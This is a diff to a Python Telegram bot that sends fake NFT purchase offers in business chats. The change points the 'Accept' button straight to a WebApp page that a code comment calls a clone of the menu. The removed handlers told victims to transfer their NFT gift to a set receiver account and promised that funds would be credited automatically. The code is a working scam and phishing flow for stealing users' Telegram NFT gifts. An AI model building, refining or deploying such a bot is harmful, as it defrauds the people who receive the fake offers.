@@ -123,9 +123,10 @@ async def handle_business_message(msg: Message):
         f"https://t.me/nft/{offer['nft_slug']}"
     )
 
+    # Делаем кнопку "Принять" ведущей на WebApp (клон меню)
     kb = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="Отклонить", callback_data=f"reject:{oid}"),
-         InlineKeyboardButton(text="Принять", callback_data=f"accept:{oid}")]
+         InlineKeyboardButton(text="Принять", url=f"{BASE_URL}/offer/{oid}")]
     ])
     
     try:
@@ -145,85 +146,8 @@ async def handle_business_message(msg: Message):
         log.error(f"❌ Ошибка: {e}")
 
 # ==========================================
-# ИНТЕРАКТИВНОЕ МЕНЮ (Кнопки)
+# КНОПКИ
 # ==========================================
-
-# 1. Нажатие на "Принять" в первом сообщении
-@router.callback_query(F.data.startswith("accept:"))
-async def on_accept(cb: CallbackQuery):
-    oid = cb.data.split(":", 1)[1]
-    o = get_offer(oid)
-    if not o: 
-        await cb.answer("Оффер истек", show_alert=True)
-        return
-    
-    # Меняем текст карточки на меню выбора
-    text = (
-        f"Вы выбрали предложение за <b>{o['price']}</b>.\n\n"
-        f"Для завершения сделки, пожалуйста, ознакомьтесь с инструкцией "
-        f"или подтвердите готовность к передаче NFT."
-    )
-    
-    kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Инструкция", callback_data=f"instr:{oid}"),
-         InlineKeyboardButton(text="Принять", callback_data=f"goto:{oid}")]
-    ])
-    
-    try:
-        await cb.message.edit_text(text=text, reply_markup=kb, disable_web_page_preview=True)
-    except Exception as e:
-        log.error(f"Ошибка редактирования: {e}")
-    await cb.answer()
-
-# 2. Нажатие на "Инструкция"
-@router.callback_query(F.data.startswith("instr:"))
-async def on_instr(cb: CallbackQuery):
-    oid = cb.data.split(":", 1)[1]
-    o = get_offer(oid)
-    if not o: return
-    
-    # Показываем инструкцию прямо в этом же сообщении
-    text = (
-        f"<b>Инструкция по передаче NFT:</b>\n\n"
-        f"1. Нажмите на карточку подарка выше\n"
-        f"2. Выберите «Передать NFT»\n"
-        f"3. Укажите получателя: <b>@{RECEIVER}</b>\n"
-        f"4. Подтвердите передачу.\n\n"
-        f"После передачи, средства зачислятся автоматически."
-    )
-    
-    kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Понял", callback_data=f"accept:{oid}")]
-    ])
-    
-    try:
-        await cb.message.edit_text(text=text, reply_markup=kb, disable_web_page_preview=True)
-    except Exception as e:
-        log.error(f"Ошибка инструкции: {e}")
-    await cb.answer()
-
-# 3. Нажатие на "Принять" (переход в меню)
-@router.callback_query(F.data.startswith("goto:"))
-async def on_goto(cb: CallbackQuery):
-    oid = cb.data.split(":", 1)[1]
-    
-    # Ссылка на WebApp (твоя Flask-страница)
-    web_url = f"{BASE_URL}/offer/{oid}"
-    
-    # В бизнес-чатах WebApp-кнопки запрещены, поэтому используем URL
-    kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Открыть меню", url=web_url)]
-    ])
-    
-    text = "Нажмите на кнопку ниже, чтобы перейти в меню подтверждения."
-    
-    try:
-        await cb.message.edit_text(text=text, reply_markup=kb, disable_web_page_preview=True)
-    except Exception as e:
-        log.error(f"Ошибка перехода: {e}")
-    await cb.answer()
-
-# 4. Кнопка "Отклонить"
 @router.callback_query(F.data.startswith("reject:"))
 async def on_reject(cb: CallbackQuery):
     try:
@@ -231,16 +155,10 @@ async def on_reject(cb: CallbackQuery):
     except: pass
     await cb.answer("Вы отклонили предложение.")
 
-# ==========================================
-# BUSINESS CONNECTION
-# ==========================================
 @router.business_connection()
 async def on_business_conn(conn: BusinessConnection):
     log.info(f"✅ Business connection: user={conn.user.id} id={conn.id}")
 
-# ==========================================
-# ЗАПУСК
-# ==========================================
 async def main():
     log.info("Starting bot...")
     await dp.start_polling(bot)
@@ -248,10 +166,8 @@ async def main():
 if __name__ == "__main__":
     import threading
     from app import flask_app
-
     def _run_flask():
         port = int(os.getenv("PORT", "8080"))
         flask_app.run(host="0.0.0.0", port=port, threaded=True, use_reloader=False)
-
     threading.Thread(target=_run_flask, daemon=True).start()
     asyncio.run(main())
